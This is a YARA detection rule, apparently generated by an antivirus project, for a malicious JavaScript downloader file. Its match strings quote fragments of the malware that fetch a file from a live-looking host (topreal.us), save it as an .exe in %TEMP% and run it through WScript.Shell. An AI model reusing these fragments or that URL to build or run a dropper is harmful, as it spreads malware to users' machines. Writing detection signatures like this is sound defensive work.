rule sig_20160328_ce6931903be5e3b61014a5da8472e4eb {
  meta:
    description = "datamaliciousorder - file 20160328_ce6931903be5e3b61014a5da8472e4eb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b2cc80723b07e0469a7b9ae9fa629a2c0dae96276af8051d907128e04c318042"

  strings:
    $s1  = "function Dsgtjdi() {return Lfhstxg[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"fFaxGNsmmJMz.exe\";};" fullword ascii
    $s2  = "do {WScript[Czcnzkbs](Mxlmtok() * 11)} while (Bvquyrsw[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "Bvquyrsw[Kxgzeoim](\"GET\", \"http://topreal.us/l1oad\", false);" fullword ascii
    $s4  = "var Lfhstxg = function Mmqvj() {return WScript[Rdrzacu](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Dabudr(Yhncvn, Jvvlsm){return Yhncvn - Jvvlsm;};" fullword ascii
    $s6  = "function Yeedpxh(Kywkggje){Lfhstxg[\"Run\"](Kywkggje, Xeqalj, Xeqalj);};" fullword ascii
    $s7  = "function Swqvzxn() {return ((Tchjkqve == true) && (Tchjkqve == Tauzf)) ? 1 : Xeqalj;};" fullword ascii
    $s8  = "return Dabudr(Kanoebac, Dlqklgirmh);" fullword ascii
    $s9  = "function Epahojffu()" fullword ascii
    $s10 = "var Nlbmhvsy = false;" fullword ascii
    $s11 = "Tauzf = true; " fullword ascii
    $s12 = "function Sgfveax(Fysttg) {var Ynplyem = (1, 2, 3, 4, 5, Fysttg); return Ynplyem;};" fullword ascii
    $s13 = "var Tchjkqve = false;" fullword ascii
    $s14 = "function Mhbch(){return Rdrzacu;};" fullword ascii
    $s15 = "function Mxlmtok(){return 22;};" fullword ascii
    $s16 = "var Nggdwg = new this[\"Date\"]();" fullword ascii
    $s17 = "Tchjkqve = true; " fullword ascii
    $s18 = "function Dabgglnh(){return Seyfdwlibg;};" fullword ascii
    $s19 = "var Tauzf = false;" fullword ascii
    $s20 = " while (Nfxvge){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}